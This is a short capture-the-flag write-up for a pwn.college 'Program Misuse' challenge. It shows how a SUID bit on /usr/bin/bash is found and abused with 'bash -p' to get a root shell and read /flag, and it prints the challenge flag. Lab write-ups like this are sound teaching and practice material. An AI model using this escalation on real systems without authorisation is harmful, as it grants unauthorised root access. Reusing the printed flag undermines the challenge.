---
layout: page
title: "Challenge Name: bash"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/bash`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/bash
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/bash
```

- The `s` in `-rws` indicates it's a SUID binary.
- `bash` runs with **root privileges**.

## 🚀 Exploitation

The `bash` -p option is used to preserve the effective user ID (EUID) when launching a new shell — specifically useful when the Bash binary is setuid root.

Means:

Launch a new Bash shell and preserve any elevated privileges (such as root) inherited from the binary.

```bash
bash -p
# cat /flag
```

Output:
```
pwn.college{YIUr8uTiej1wnkexE_M9d1NqxJf.dZDOxwSM0IzMyEzW}
```
